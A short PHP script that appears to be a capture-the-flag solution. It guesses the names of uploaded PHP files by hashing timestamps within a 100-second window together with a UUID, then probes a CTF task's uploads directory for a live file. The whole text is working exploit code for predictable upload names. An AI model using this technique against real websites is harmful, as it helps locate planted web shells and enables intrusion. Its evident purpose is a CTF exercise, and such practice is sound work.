<?php

$uuid = "<UUID>";
$t = time() - 50;
$u = "https://esick.student2020tasks.ctf.su/uploads/";

for ($time =  $t; $time <= $t + 100; $time++) {

$ext = 'php';
$newname = hash("gost", $time . $uuid).".".$ext;
$url = $u . $newname;
echo $time;
$headers = get_headers($url);
if (strpos( $headers[0], '200')) {
    echo $url;
}
}


?>
